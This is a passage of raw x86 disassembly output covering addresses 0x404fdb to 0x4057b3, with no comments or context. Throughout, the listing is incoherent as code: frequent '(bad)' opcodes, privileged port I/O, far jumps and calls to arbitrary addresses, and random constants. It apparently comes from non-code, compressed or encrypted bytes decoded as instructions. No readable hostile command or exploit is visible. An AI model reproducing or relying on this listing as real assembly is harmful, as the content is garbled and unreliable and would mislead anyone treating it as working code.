  404fdb:	shl    ebp,cl
  404fdd:	sahf   
  404fde:	fs (bad) 
  404fe0:	shr    DWORD PTR [edi-0x68d74ddc],1
  404fe6:	in     eax,0xed
  404fe8:	std    
  404fe9:	dec    ebp
  404fea:	in     eax,dx
  404feb:	jp     0x404f88
  404fed:	xor    al,0x57
  404fef:	out    0x56,eax
  404ff1:	mov    cl,0xf8
  404ff3:	dec    ecx
  404ff4:	inc    ecx
  404ff5:	popf   
  404ff6:	mov    eax,ebx
  404ff8:	fwait
  404ff9:	add    al,0x21
  404ffb:	jnp    0x404f9a
  404ffd:	bound  ecx,QWORD PTR [edx+0x5b744327]
  405003:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405004:	pop    ebx
  405005:	or     BYTE PTR [edx],ch
  405007:	sbb    al,0xc1
  405009:	xchg   BYTE PTR [esi+0x7e3a35a7],dh
  40500f:	adc    DWORD PTR [edi-0x7527195],esp
  405015:	rol    DWORD PTR [ecx-0x41],cl
  405018:	and    eax,0xff188fc5
  40501d:	dec    ebp
  40501e:	ret    0x8567
  405021:	mov    esi,0xb1cfd5d0
  405026:	shl    al,0x18
  405029:	push   0xc18819f5
  40502e:	xor    al,0x59
  405030:	or     dh,BYTE PTR [esi]
  405032:	stos   DWORD PTR es:[edi],eax
  405033:	mov    ebp,0xe1b1eb4d
  405038:	imul   ebx,edi,0xffffff83
  40503b:	jnp    0x404fd6
  40503d:	hlt    
  40503e:	jle    0x405089
  405040:	xchg   esi,esi
  405042:	daa    
  405043:	jb     0x4050be
  405045:	repz ja 0x404ffb
  405048:	sbb    eax,0xd2ab35e8
  40504d:	sub    DWORD PTR [edx],ecx
  40504f:	loopne 0x40509e
  405051:	div    DWORD PTR [edx-0x5e]
  405054:	add    ebx,DWORD PTR cs:[eax]
  405057:	add    DWORD PTR [esi-0xf],edx
  40505a:	mov    eax,0x58e0ec9c
  40505f:	out    dx,eax
  405060:	fdivr  DWORD PTR [esi]
  405062:	cld    
  405063:	fild   WORD PTR [esi+0x75dafeb6]
  405069:	test   dl,ah
  40506b:	mov    dl,0x29
  40506d:	xchg   DWORD PTR [ebx+ecx*4],eax
  405070:	mul    DWORD PTR es:[ebx+ecx*2]
  405074:	sbb    BYTE PTR [esi+ecx*4-0x45],ch
  405078:	(bad)  
  405079:	sbb    DWORD PTR [ebp+0x7621b49],ecx
  40507f:	ins    BYTE PTR es:[edi],dx
  405080:	adc    eax,0x1ab7aded
  405085:	inc    esp
  405086:	shl    edi,0x48
  405089:	dec    esi
  40508a:	scas   eax,DWORD PTR es:[edi]
  40508b:	jecxz  0x4050d3
  40508d:	shr    BYTE PTR [edi-0x4c1c97a7],1
  405093:	rcl    DWORD PTR [edx+eax*2-0x3aad3e63],cl
  40509a:	cmc    
  40509b:	jbe    0x405082
  40509d:	(bad)  
  40509e:	dec    ebp
  40509f:	adc    al,0xd7
  4050a1:	fistp  DWORD PTR [eax]
  4050a3:	retf   0x20c4
  4050a6:	mov    ah,0x3f
  4050a8:	fist   DWORD PTR [edi]
  4050aa:	pop    esp
  4050ab:	and    DWORD PTR [ebx+0x7aaa5846],ebx
  4050b1:	cmp    al,0x96
  4050b3:	add    cl,BYTE PTR [esi+0x70]
  4050b6:	ffree  st(3)
  4050b8:	adc    BYTE PTR ds:0x1c74c4a0,0xab
  4050bf:	mov    BYTE PTR [esi],bh
  4050c1:	sbb    dl,BYTE PTR [ebp+0x61]
  4050c4:	jecxz  0x405096
  4050c6:	and    al,BYTE PTR [edx-0x5199e01b]
  4050cc:	(bad)  
  4050cd:	rcr    DWORD PTR [ebp-0x14c1b310],1
  4050d3:	sub    eax,0x84d6f063
  4050d8:	fsub   QWORD PTR [esi+0x37]
  4050db:	sub    al,BYTE PTR [edx+0x33]
  4050de:	and    esp,esp
  4050e0:	xchg   edx,esi
  4050e2:	push   ss
  4050e3:	mov    WORD PTR [ebp+eax*2+0x7],es
  4050e7:	scas   eax,DWORD PTR es:[edi]
  4050e8:	add    bl,cl
  4050ea:	and    ecx,DWORD PTR [edx]
  4050ec:	call   0xdcff:0x2330f8f
  4050f3:	mov    bl,0xc
  4050f5:	mov    ecx,0x9297f2e8
  4050fa:	aaa    
  4050fb:	dec    edi
  4050fc:	xchg   DWORD PTR ds:0x21688c13,esi
  405102:	ret    
  405103:	(bad)  
  405105:	xchg   ebp,eax
  405106:	fadd   QWORD PTR [ebx-0x429e09e2]
  40510c:	imul   edi,esp,0x7e
  40510f:	xor    edi,DWORD PTR [eax]
  405111:	fistp  DWORD PTR [edx+ebp*1]
  405114:	sub    al,0xe
  405116:	mov    ds:0xd6b57a4d,eax
  40511b:	fimul  DWORD PTR [ecx]
  40511d:	sbb    dh,bl
  40511f:	cmp    al,0xea
  405121:	xchg   esi,eax
  405122:	jp     0x4050ca
  405124:	mov    bl,0x62
  405126:	sub    al,0xc7
  405128:	cmp    BYTE PTR [edx-0x7f],0x59
  40512c:	sbb    DWORD PTR [edi+0x72],eax
  40512f:	inc    ebx
  405130:	mov    BYTE PTR [ebp+0x8ad08f7],ch
  405136:	xor    al,0xb3
  405138:	adc    ah,bl
  40513a:	push   ecx
  40513b:	shr    BYTE PTR [eax+eiz*8+0x232244b6],1
  405142:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405143:	push   ds
  405144:	xchg   ebx,eax
  405145:	std    
  405146:	cmp    ch,BYTE PTR [esi]
  405148:	xchg   ebx,eax
  405149:	ins    DWORD PTR es:[edi],dx
  40514a:	icebp  
  40514b:	sub    eax,0x27b41b7d
  405150:	adc    DWORD PTR [ebp-0x7680deba],0xad6b966
  40515a:	outs   dx,BYTE PTR ds:[esi]
  40515b:	les    ebp,FWORD PTR [edx+edi*1+0x7eca1db5]
  405162:	fidivr WORD PTR [ebx+0x18]
  405165:	dec    edi
  405166:	(bad)  
  405167:	xor    BYTE PTR [esi],bl
  405169:	and    ecx,DWORD PTR ds:0xc6945d6d
  40516f:	shrd   ebp,ebx,cl
  405172:	sub    DWORD PTR [ebp+0x67],edx
  405175:	mov    eax,ds:0x43c5dd7e
  40517a:	and    ch,BYTE PTR [edi-0x1]
  40517d:	cmp    al,0xfc
  40517f:	bound  ebp,QWORD PTR [esp+ecx*1]
  405182:	and    al,0x9b
  405184:	jb     0x4051db
  405186:	mov    ds:0x1f46eff0,eax
  40518b:	stos   DWORD PTR es:[edi],eax
  40518c:	and    dl,cl
  40518e:	jno    0x4051aa
  405190:	or     eax,0x39420d10
  405195:	mov    fs,WORD PTR [edi]
  405197:	in     al,dx
  405198:	sbb    eax,0xe883a247
  40519d:	mov    ds:0x6a11f3df,eax
  4051a2:	loop   0x405214
  4051a4:	pop    esi
  4051a5:	mov    ebp,0x796bff48
  4051aa:	pop    ds
  4051ab:	dec    edi
  4051ac:	(bad)  
  4051ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051ae:	mov    esp,0x3ee3a2f2
  4051b3:	cdq    
  4051b4:	fst    QWORD PTR [ecx-0x25e6c8a2]
  4051ba:	jne    0x40516c
  4051bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051bd:	(bad)  
  4051be:	jmp    0x6ba4:0xd14750c
  4051c5:	(bad)  
  4051c6:	adc    bl,dh
  4051c8:	fld    TBYTE PTR [edi]
  4051cb:	pop    esi
  4051cc:	push   0xffffff9f
  4051ce:	popa   
  4051cf:	push   edi
  4051d0:	and    eax,0xe965dcb2
  4051d5:	aas    
  4051d6:	cwde   
  4051d7:	cmc    
  4051d8:	xor    ah,BYTE PTR [ebx+edx*8-0x4d0769f8]
  4051df:	dec    esi
  4051e0:	add    al,0x8e
  4051e2:	mov    ds:0x3563f255,eax
  4051e7:	stc    
  4051e8:	adc    BYTE PTR [esi],0xb4
  4051eb:	sti    
  4051ec:	sub    ch,BYTE PTR [edx+0x43a3f6e8]
  4051f2:	mov    ds:0x392d2437,eax
  4051f7:	or     BYTE PTR [esi-0x2],0x22
  4051fb:	lock adc bh,al
  4051fe:	add    BYTE PTR [edi+0x38],dh
  405201:	cmp    al,BYTE PTR ds:0xce0a075a
  405207:	fcomi  st,st(4)
  405209:	inc    edi
  40520a:	sbb    ah,BYTE PTR [esi]
  40520c:	sbb    ch,BYTE PTR [eax+eax*4-0x2f]
  405210:	call   0x3d47:0xf56e922a
  405217:	sub    DWORD PTR [ecx+0x74],0x8e515eba
  40521e:	repnz cdq 
  405220:	aaa    
  405221:	sbb    DWORD PTR [esi+0x43461d82],esp
  405227:	fild   DWORD PTR [ebx-0x41d3b438]
  40522d:	adc    BYTE PTR [eax+0x66],cl
  405230:	rol    BYTE PTR [edx],0xa2
  405233:	cmp    eax,0x869cc65d
  405238:	adc    DWORD PTR [ebp+0x2b],ebx
  40523b:	push   ebp
  40523c:	repz sub al,0xd3
  40523f:	push   es
  405240:	add    ebx,ebx
  405242:	shr    BYTE PTR [eax],cl
  405244:	sub    eax,0xd3e45947
  405249:	push   ds
  40524a:	or     eax,0xae51c91c
  40524f:	push   esp
  405250:	mov    al,0xf9
  405252:	xor    BYTE PTR [edi],ch
  405254:	cmp    al,0x60
  405256:	pusha  
  405257:	pop    edx
  405258:	js     0x4052ac
  40525a:	cwde   
  40525b:	jp     0x4052da
  40525d:	loop   0x4051e5
  40525f:	xor    DWORD PTR [ebp+0x5db73625],0x977169e9
  405269:	repnz mov cl,0xa9
  40526c:	daa    
  40526d:	mov    edi,0xc9974be9
  405272:	xor    BYTE PTR [ebp+0x6],0x47
  405276:	loopne 0x4052b6
  405278:	sbb    esi,0xffffffc0
  40527b:	pop    ebx
  40527c:	into   
  40527d:	push   ds
  40527e:	or     eax,DWORD PTR ds:0x5f825edb
  405284:	xor    cl,bl
  405286:	or     DWORD PTR [ebx+0x5cbd392],edi
  40528c:	dec    esp
  40528d:	pop    ebx
  40528e:	pop    ecx
  40528f:	repz mov ebx,0x6e128a9c
  405295:	loope  0x405269
  405297:	pop    esp
  405298:	and    BYTE PTR [edx-0x18],ah
  40529b:	out    0xff,al
  40529d:	push   0xd2ba7938
  4052a2:	ins    BYTE PTR es:[edi],dx
  4052a3:	and    al,0x31
  4052a5:	fcomp  st(0)
  4052a7:	sti    
  4052a8:	outs   dx,DWORD PTR ds:[esi]
  4052a9:	retf   0x2d89
  4052ac:	xchg   ebx,eax
  4052ad:	sub    al,0xb1
  4052af:	in     al,0x9f
  4052b1:	js     0x405315
  4052b3:	jns    0x405269
  4052b5:	cmc    
  4052b6:	lods   eax,DWORD PTR ds:[esi]
  4052b7:	outs   dx,DWORD PTR ds:[esi]
  4052b8:	sub    DWORD PTR [ebx-0x51],0x690ca27c
  4052bf:	inc    esp
  4052c0:	mov    DWORD PTR [esi],esi
  4052c2:	fstp   st(7)
  4052c4:	mov    ebx,DWORD PTR [ecx+0x1dadeb75]
  4052ca:	aam    0xf9
  4052cc:	pop    ss
  4052cd:	or     BYTE PTR [eax+edi*4+0x4e],bh
  4052d1:	or     esp,eax
  4052d3:	in     eax,0x65
  4052d5:	shl    BYTE PTR [esi+0x54],0xe4
  4052d9:	ins    DWORD PTR es:[edi],dx
  4052da:	push   0xb2633da8
  4052df:	outs   dx,BYTE PTR ds:[esi]
  4052e0:	fstp   QWORD PTR [ebx+0xc398daa]
  4052e6:	js     0x4052c5
  4052e8:	test   eax,0xf9eff7ca
  4052ed:	enter  0x6e64,0x48
  4052f1:	outs   dx,BYTE PTR ds:[esi]
  4052f2:	mov    ebp,0x2f62cd01
  4052f7:	mov    ebx,0xf9f7a43e
  4052fc:	jg     0x4052cc
  4052fe:	(bad)  
  4052ff:	stc    
  405300:	popf   
  405301:	mov    esi,0xa4f77be6
  405306:	fiadd  WORD PTR [edx]
  405308:	pop    esp
  405309:	popf   
  40530a:	sub    BYTE PTR [ecx],ch
  40530c:	pop    edx
  40530d:	inc    ecx
  40530e:	xor    al,0xb0
  405310:	test   al,0x1e
  405312:	adc    BYTE PTR [ebx-0x4b54a895],ch
  405318:	add    eax,0xdee4919a
  40531d:	daa    
  40531e:	add    ch,ch
  405320:	dec    ebx
  405321:	sub    eax,0xff6e98a6
  405326:	call   0xe6d80284
  40532b:	cmp    eax,ecx
  40532d:	fisttp DWORD PTR [edx]
  40532f:	ret    
  405330:	or     BYTE PTR [eax+ebp*2],al
  405333:	dec    ebp
  405334:	cld    
  405335:	adc    BYTE PTR [ebx+0x651e6d96],dl
  40533b:	sub    BYTE PTR [ebp+0x48003d10],0x5a
  405342:	xchg   edi,eax
  405343:	cmp    al,0xf
  405345:	lock push eax
  405347:	sbb    eax,edx
  405349:	sbb    eax,edi
  40534b:	inc    esp
  40534c:	xchg   ebp,eax
  40534d:	lock jg 0x4052dd
  405350:	push   es
  405351:	stos   DWORD PTR es:[edi],eax
  405352:	xchg   edi,eax
  405353:	inc    esi
  405354:	dec    ebx
  405355:	cmp    esp,DWORD PTR ds:0x25850d00
  40535b:	xchg   ebx,eax
  40535c:	inc    ebp
  40535d:	dec    esp
  40535e:	and    cl,ch
  405360:	push   esi
  405361:	jle    0x40535a
  405363:	jae    0x4053d0
  405365:	sub    eax,0xb00eb755
  40536a:	scas   eax,DWORD PTR es:[edi]
  40536b:	jo     0x40536c
  40536d:	dec    ebp
  40536e:	rcr    esi,cl
  405370:	jbe    0x405356
  405372:	mov    esi,0x5c4be90c
  405377:	loope  0x4053e6
  405379:	add    al,0x92
  40537b:	mov    al,BYTE PTR [ecx]
  40537d:	xchg   ecx,eax
  40537e:	mov    bh,0xa
  405380:	xor    bl,ah
  405382:	(bad)  
  405383:	mov    ch,0x95
  405385:	sub    eax,0x8af47177
  40538a:	adc    eax,DWORD PTR [edi+ebp*8+0x48]
  40538e:	sbb    al,0x37
  405390:	jns    0x4053c6
  405392:	shl    DWORD PTR [ebx+0x8],1
  405395:	(bad)  
  405396:	test   eax,0xf6a6da1e
  40539b:	jge    0x40531e
  40539d:	enter  0xb5f0,0x4
  4053a1:	mov    ebx,0x4655ef8b
  4053a6:	and    al,0xe0
  4053a8:	fistp  QWORD PTR fs:[esi]
  4053ab:	test   ch,al
  4053ad:	lods   al,BYTE PTR ds:[esi]
  4053ae:	mov    eax,ds:0xa3686a11
  4053b3:	arpl   WORD PTR fs:[eax],dx
  4053b6:	mov    esi,0x86b12dc9
  4053bb:	mov    al,ds:0x6adf767c
  4053c0:	dec    esi
  4053c1:	leave  
  4053c2:	(bad)  
  4053c3:	push   cs
  4053c4:	call   edx
  4053c6:	add    BYTE PTR [esi],ch
  4053c8:	push   ebp
  4053c9:	pop    ecx
  4053ca:	inc    esp
  4053cb:	xchg   ebp,esi
  4053cd:	mov    eax,es
  4053cf:	and    BYTE PTR [edi-0x72],dl
  4053d2:	jge    0x4053bc
  4053d4:	sbb    ah,dh
  4053d6:	ja     0x405368
  4053d8:	add    DWORD PTR [edi-0x3764e7fe],eax
  4053de:	aas    
  4053df:	stos   BYTE PTR es:[edi],al
  4053e0:	cwde   
  4053e1:	sbb    bh,BYTE PTR [ecx-0x2a]
  4053e4:	gs test al,0x91
  4053e7:	out    dx,al
  4053e8:	pop    ebp
  4053e9:	mov    edi,0x288fd396
  4053ee:	ds retf 
  4053f0:	scas   eax,DWORD PTR es:[edi]
  4053f1:	xchg   esp,eax
  4053f2:	int    0xc9
  4053f4:	cmp    ch,BYTE PTR [edi+0x71]
  4053f7:	xor    eax,0xcec13504
  4053fc:	stc    
  4053fd:	lea    ebx,[eax-0xc4fd9ee]
  405403:	inc    ebp
  405404:	lds    edx,FWORD PTR [edx+0x3bb59edf]
  40540a:	aad    0x39
  40540c:	jne    0x4053c0
  40540e:	jmp    0x696a3307
  405413:	pop    ds
  405414:	push   esp
  405415:	leave  
  405416:	mov    ds,esp
  405418:	fstp   TBYTE PTR [ecx+0x4]
  40541b:	sub    DWORD PTR [eax],ebx
  40541d:	pusha  
  40541e:	cmp    ebp,DWORD PTR [ebx+0x20]
  405421:	xor    al,0x0
  405423:	inc    ebp
  405424:	jl     0x40548e
  405426:	sub    DWORD PTR [ebp-0xb],edx
  405429:	dec    BYTE PTR [ebx]
  40542b:	xchg   DWORD PTR [edx+0x3d],ecx
  40542e:	xlat   BYTE PTR ds:[ebx]
  40542f:	dec    ecx
  405430:	test   DWORD PTR [edx],esp
  405432:	out    dx,al
  405433:	mov    cl,0x0
  405435:	xchg   ecx,eax
  405436:	and    ecx,edi
  405438:	(bad)  
  405439:	aam    0xcc
  40543b:	pop    esp
  40543c:	mov    al,ds:0x99313542
  405441:	pop    ebx
  405442:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405443:	or     esi,DWORD PTR [esi-0x6f2c5e49]
  405449:	or     esp,DWORD PTR [eax]
  40544b:	mov    ds:0x8817b089,al
  405450:	jl     0x4054a6
  405452:	jo     0x405466
  405454:	gs in  al,dx
  405456:	xor    eax,0x44e518f
  40545b:	push   edi
  40545c:	cmp    al,0x48
  40545e:	mov    ebx,0x18d66d82
  405463:	sbb    ch,al
  405465:	xor    al,0x5
  405467:	ret    
  405468:	popf   
  405469:	dec    ebp
  40546a:	adc    DWORD PTR [ecx-0x3d],esp
  40546d:	mov    edi,0x40fdbd2b
  405472:	cmp    eax,DWORD PTR [ebx+0x71cd45a6]
  405478:	cmp    al,0x21
  40547a:	jmp    0x515b:0x7f30c182
  405481:	imul   ecx,DWORD PTR [eax+ebp*8],0x1f590dca
  405488:	es jne 0x4054bc
  40548b:	push   ecx
  40548c:	or     BYTE PTR [ebx+edx*4+0x62be383e],0xb4
  405494:	hlt    
  405495:	test   al,0x73
  405497:	fisub  WORD PTR [edx]
  405499:	mov    ds:0xa8fe03ef,eax
  40549e:	sub    edx,DWORD PTR [esi+eiz*2-0x4e66e2c4]
  4054a5:	call   0xf0d96a6e
  4054aa:	shl    BYTE PTR [ebx-0x19],1
  4054ad:	add    DWORD PTR [ebp-0xf7a8105],edx
  4054b3:	fistp  WORD PTR [ecx+0x6e]
  4054b6:	lea    esi,[esp+eax*1+0x30]
  4054ba:	add    al,0x1d
  4054bc:	and    ebp,DWORD PTR [edi-0x3e]
  4054bf:	aas    
  4054c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054c2:	fmul   st,st(3)
  4054c4:	cmp    DWORD PTR [ecx+0x77c45bda],ebp
  4054ca:	pusha  
  4054cb:	addr16 adc eax,0x81ca3764
  4054d1:	outs   dx,DWORD PTR ds:[esi]
  4054d2:	ss pop edi
  4054d4:	mov    ch,0x17
  4054d6:	loopne 0x405486
  4054d8:	adc    BYTE PTR [ecx-0x70],bh
  4054db:	or     DWORD PTR [edx],0xfffffff9
  4054de:	repnz inc esi
  4054e0:	xchg   edx,eax
  4054e1:	outs   dx,BYTE PTR ds:[esi]
  4054e2:	dec    ebp
  4054e3:	xchg   edx,ecx
  4054e5:	sbb    eax,0x410890f
  4054ea:	add    BYTE PTR [esi-0x7b9a3f10],bl
  4054f0:	data16 test cl,dl
  4054f3:	repnz or edx,DWORD PTR [edi+0x66]
  4054f7:	outs   dx,DWORD PTR ds:[esi]
  4054f8:	sbb    bl,BYTE PTR [ebp-0x11]
  4054fb:	mov    dh,0xcf
  4054fd:	lods   al,BYTE PTR fs:[esi]
  4054ff:	pusha  
  405500:	in     al,0x1f
  405502:	sbb    edx,ebx
  405504:	xchg   ebp,eax
  405505:	push   ebp
  405506:	mov    ds:0x3e5f6a61,eax
  40550b:	gs scas al,BYTE PTR es:[edi]
  40550d:	mov    ds:0xb645c11a,eax
  405512:	mov    edx,esp
  405514:	mov    ch,0x64
  405516:	push   edi
  405517:	(bad)  
  405518:	lock jno 0x4054ce
  40551b:	push   edx
  40551c:	pusha  
  40551d:	inc    edi
  40551e:	leave  
  40551f:	jmp    FWORD PTR [edx-0xad101d7]
  405525:	popf   
  405526:	lea    esi,[ecx+0x3cec7e58]
  40552c:	lods   eax,DWORD PTR ds:[esi]
  40552d:	and    al,cl
  40552f:	sub    BYTE PTR [ebx],bl
  405531:	xchg   ebx,eax
  405532:	das    
  405533:	dec    edi
  405534:	sbb    eax,0x9a6d14d2
  405539:	test   DWORD PTR [edi],ecx
  40553b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40553c:	jb     0x4054ce
  40553e:	test   DWORD PTR [edi+0x6d],eax
  405541:	mov    al,0x82
  405543:	sti    
  405544:	aam    0x8b
  405546:	nop
  405547:	push   edx
  405548:	cmp    bl,al
  40554a:	mov    bh,0x2f
  40554c:	gs push edi
  40554e:	jl     0x4055ba
  405550:	out    0x7f,al
  405552:	or     DWORD PTR [ebx+0x79],esp
  405555:	dec    edx
  405556:	cmp    ebp,edi
  405558:	inc    ebp
  405559:	jns    0x4055d7
  40555b:	push   ebx
  40555c:	rol    cl,1
  40555e:	sbb    DWORD PTR [ebx],ecx
  405560:	into   
  405561:	and    edi,edi
  405563:	cs adc eax,0x4dff14b6
  405569:	xor    dl,bl
  40556b:	add    bh,BYTE PTR [ebx+0xe3b1b27]
  405571:	add    ah,BYTE PTR [eax-0x38]
  405574:	mov    ecx,0x82248953
  405579:	js     0x4055d9
  40557b:	fdivrp st(5),st
  40557d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40557e:	sbb    eax,0x33ce0a45
  405583:	imul   ebx,DWORD PTR ds:0xe9a250c9,0xffffff8a
  40558a:	aad    0x12
  40558c:	sbb    al,0x1b
  40558e:	cmp    edx,DWORD PTR [eax]
  405590:	and    DWORD PTR [ebx],0x6a1436b0
  405596:	sbb    al,0xf4
  405598:	dec    ebp
  405599:	add    al,0x8b
  40559b:	or     eax,DWORD PTR [ecx-0x7a]
  40559e:	add    esp,DWORD PTR [edx+0x53]
  4055a1:	enter  0x78ff,0x5a
  4055a5:	sbb    BYTE PTR [edx+esi*8-0x6e13aa58],ah
  4055ac:	fidiv  DWORD PTR [ebx]
  4055ae:	nop
  4055af:	push   edx
  4055b0:	mov    DWORD PTR [ebp-0x10],edi
  4055b3:	adc    ch,ah
  4055b5:	jecxz  0x4055fe
  4055b7:	stc    
  4055b8:	xlat   BYTE PTR ds:[ebx]
  4055b9:	ret    0x7d20
  4055bc:	es xchg edx,eax
  4055be:	add    al,0xbd
  4055c0:	das    
  4055c1:	in     eax,dx
  4055c2:	adc    edi,DWORD PTR [esi-0x45]
  4055c5:	stc    
  4055c6:	cmc    
  4055c7:	outs   dx,DWORD PTR ds:[esi]
  4055c8:	mov    al,0x9c
  4055ca:	push   DWORD PTR [ebx+ebp*1-0x54a57444]
  4055d1:	pop    edi
  4055d2:	dec    ebp
  4055d3:	mov    ds:0xf995f40d,al
  4055d8:	adc    BYTE PTR [edx+edi*2-0x504b3ad1],cl
  4055df:	adc    BYTE PTR [esi+ecx*2-0x1f3f4dc9],al
  4055e6:	pop    ebp
  4055e7:	mov    gs,WORD PTR [eax-0x6baf8b71]
  4055ed:	sahf   
  4055ee:	fst    QWORD PTR [esi-0xf]
  4055f1:	push   esi
  4055f2:	rcr    ah,1
  4055f4:	jno    0x40565d
  4055f6:	sbb    eax,0x399e4770
  4055fb:	mov    cl,0xae
  4055fd:	dec    ecx
  4055fe:	(bad)  
  405600:	in     al,dx
  405601:	add    sp,WORD PTR ds:0x7530abbe
  405608:	xchg   ebx,eax
  405609:	dec    edx
  40560a:	and    ch,BYTE PTR cs:[ecx]
  40560d:	lods   eax,DWORD PTR ds:[esi]
  40560e:	jge    0x4055a1
  405610:	dec    ecx
  405611:	sbb    ecx,DWORD PTR [esi+ebp*8+0x5e85e2da]
  405618:	inc    ecx
  405619:	mov    dl,0x7a
  40561b:	cli    
  40561c:	cli    
  40561d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40561e:	loopne 0x4055b7
  405620:	mov    esp,DWORD PTR [esi+0x6b]
  405623:	out    0xba,eax
  405625:	cmp    DWORD PTR [ebp+0x2d],ecx
  405628:	mov    ebx,0x5dd6c33f
  40562d:	pop    ebp
  40562e:	mov    fs,WORD PTR [eax-0x4c]
  405631:	je     0x4056b1
  405633:	sar    BYTE PTR [edi],cl
  405635:	xor    BYTE PTR [ebp+0xe],bh
  405638:	xor    al,0xc2
  40563a:	adc    ebp,ebx
  40563c:	fiadd  DWORD PTR [ebx-0x2e1f4c3a]
  405642:	adc    BYTE PTR [ebx],al
  405644:	pop    edi
  405645:	pop    esp
  405646:	push   0xffffff94
  405648:	fnstenv [ebp+0x39]
  40564b:	jg     0x405601
  40564d:	mov    dh,0xeb
  40564f:	not    BYTE PTR [ebp-0x12]
  405652:	ror    ebp,0x6c
  405655:	es (bad) 
  405657:	imul   BYTE PTR [ebx]
  405659:	dec    esi
  40565a:	out    0x7a,eax
  40565c:	out    dx,al
  40565d:	cli    
  40565e:	pop    ds
  40565f:	arpl   WORD PTR [edx+0x28],cx
  405662:	call   0x9b153f66
  405667:	(bad)  
  405668:	mov    esi,0xe7f4f1ca
  40566d:	stos   DWORD PTR es:[edi],eax
  40566e:	or     dh,BYTE PTR [ebx-0x1b4e47c9]
  405674:	push   esp
  405675:	inc    edx
  405676:	nop
  405677:	push   0x52
  405679:	es imul ecx,ebp,0xffffffec
  40567d:	and    al,0x32
  40567f:	xor    BYTE PTR [ebx+0x1c],al
  405682:	gs je  0x4056ad
  405685:	mov    al,ds:0xead25bb2
  40568a:	fdiv   st,st(7)
  40568c:	nop
  40568d:	loope  0x40561c
  40568f:	mov    ecx,0xaa38baa6
  405694:	out    0xc8,al
  405696:	fidiv  WORD PTR [edi-0x11]
  405699:	push   es
  40569a:	dec    edi
  40569b:	cmp    BYTE PTR [esi-0x1b],0x0
  40569f:	mov    WORD PTR [esi-0x53],fs
  4056a2:	cmp    esi,DWORD PTR [ebx-0x78]
  4056a5:	mov    bl,0x49
  4056a7:	mov    DWORD PTR [esi],esi
  4056a9:	mov    ah,0x50
  4056ab:	and    BYTE PTR [edx+0x7aa28b85],cl
  4056b1:	xor    edx,DWORD PTR [eax-0x598e7b8b]
  4056b7:	fisubr DWORD PTR [esi]
  4056b9:	test   al,0xff
  4056bb:	clc    
  4056bc:	(bad)  
  4056be:	dec    esp
  4056bf:	pop    ebx
  4056c0:	push   ebp
  4056c1:	push   ds
  4056c2:	ins    BYTE PTR es:[edi],dx
  4056c3:	adc    al,0x49
  4056c5:	adc    edi,ecx
  4056c7:	cld    
  4056c8:	push   esp
  4056c9:	je     0x4056b2
  4056cb:	fs jnp 0x405723
  4056ce:	inc    BYTE PTR [ecx]
  4056d0:	scas   al,BYTE PTR es:[edi]
  4056d1:	jb     0x4056c8
  4056d3:	sbb    bh,dh
  4056d5:	xchg   ebp,eax
  4056d6:	call   0x6e149ba6
  4056db:	dec    esp
  4056dc:	fisubr WORD PTR [eax+0x61868625]
  4056e2:	xchg   BYTE PTR ds:0xe9348873,dl
  4056e8:	xchg   ebx,eax
  4056e9:	xlat   BYTE PTR ds:[ebx]
  4056ea:	call   0x7fe09b17
  4056ef:	retf   0x22a7
  4056f2:	test   ebx,eax
  4056f4:	add    ch,BYTE PTR [eax+eax*2]
  4056f7:	imul   eax,edx,0xffffffc1
  4056fa:	test   eax,0xc6da9486
  4056ff:	adc    dh,cl
  405701:	push   ss
  405702:	pop    esp
  405703:	out    dx,al
  405704:	xchg   ebp,eax
  405705:	push   edx
  405706:	cmc    
  405707:	sub    al,0x23
  405709:	scas   eax,DWORD PTR es:[edi]
  40570a:	test   cl,ah
  40570c:	(bad)  
  40570d:	mov    esp,0x6047f5d1
  405712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405713:	sbb    cl,0x3f
  405716:	mov    al,ds:0xc30b19b8
  40571b:	mov    eax,ds:0xbac15a24
  405720:	cld    
  405721:	sti    
  405722:	repnz adc edx,edx
  405725:	int    0xec
  405727:	(bad)  
  405728:	cld    
  405729:	into   
  40572a:	cmp    BYTE PTR [edi],bl
  40572c:	lahf   
  40572d:	mov    dh,0x75
  40572f:	loope  0x405753
  405731:	inc    ebx
  405732:	or     BYTE PTR [eax+0x41],ah
  405735:	adc    BYTE PTR [edi],ah
  405737:	jle    0x405704
  405739:	mov    al,ds:0x2772a09f
  40573e:	sbb    edi,ebp
  405740:	mov    cl,0xab
  405742:	jp     0x405775
  405744:	mov    al,0x2c
  405746:	add    eax,0x55b097cd
  40574b:	(bad)  
  40574c:	sar    BYTE PTR [ebx-0x22353125],1
  405752:	inc    edi
  405753:	cdq    
  405754:	xor    al,0x76
  405756:	test   eax,0x3a2eb98
  40575b:	mov    bh,0x92
  40575d:	push   ecx
  40575e:	lea    eax,[ebx+0x42]
  405761:	cs push ecx
  405763:	pop    edx
  405764:	push   ebx
  405765:	bound  ecx,QWORD PTR [ebp+edx*4-0x3f061e27]
  40576c:	adc    eax,0xb1698154
  405771:	push   ds
  405772:	sar    ebx,0xeb
  405775:	xor    ah,BYTE PTR [esp+ecx*8-0x28]
  405779:	push   ebx
  40577a:	mov    al,ds:0xe795eea7
  40577f:	faddp  st(0),st
  405781:	jg     0x4057b4
  405783:	xchg   esi,eax
  405784:	mul    BYTE PTR [ebp+0x4d493409]
  40578a:	and    cl,dh
  40578c:	sub    DWORD PTR [ecx+0x5e],ecx
  40578f:	push   ss
  405790:	cmp    eax,0x8bab1b35
  405795:	inc    edx
  405796:	xor    ecx,DWORD PTR [ecx-0x344d083d]
  40579c:	test   esi,edx
  40579e:	mov    edx,0x599e02c5
  4057a3:	inc    edi
  4057a4:	scas   al,BYTE PTR es:[edi]
  4057a5:	inc    esp
  4057a6:	pop    ss
  4057a7:	xchg   esp,eax
  4057a8:	int3   
  4057a9:	mov    esp,0xd8645bbf
  4057ae:	or     DWORD PTR [ebp-0x2b],edx
  4057b1:	jb     0x405787
  4057b3:	sti    
